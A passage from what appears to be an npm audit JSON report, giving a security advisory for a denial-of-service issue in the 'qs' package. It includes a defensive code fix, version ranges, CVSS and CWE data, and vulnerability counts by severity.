mirroring `utils.isRegExp`:\n\n```js\nvar isBuffer = function isBuffer(obj) {\n    if (!obj || typeof obj !== 'object') { return false; }\n    if (typeof Buffer !== 'undefined' && typeof Buffer.isBuffer === 'function') {\n        return Buffer.isBuffer(obj);\n    }\n    return Object.prototype.toString.call(obj) === '[object Uint8Array]';\n};\n```\n\nIf duck-typing must remain, require `typeof obj.constructor.isBuffer === 'function'` before invoking and wrap the call in `try/catch`.",
+      "reported_by": null,
+      "title": "qs: Denial of Service via Attacker Controlled isBuffer",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-82417"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "qs",
+      "vulnerable_versions": ">=2.2.5 <6.16.0",
+      "github_advisory_id": "GHSA-4mjr-xmp4-gh2g",
+      "recommendation": "Upgrade to version 6.16.0 or later",
+      "patched_versions": ">=6.16.0",
+      "updated": "2026-09-02T14:45:15.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-4mjr-xmp4-gh2g"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 2,
+      "moderate": 11,
+      "high": 6,
+      "critical": 4
+    },
+    "dependencies": 50,
+    "devDependencies": 23,
+    "optionalDependencies": 0,
+    "totalDependencies": 73
+  },
+  "runId": "b0402f33-9093-462d-849d-d4e445476344"
+}
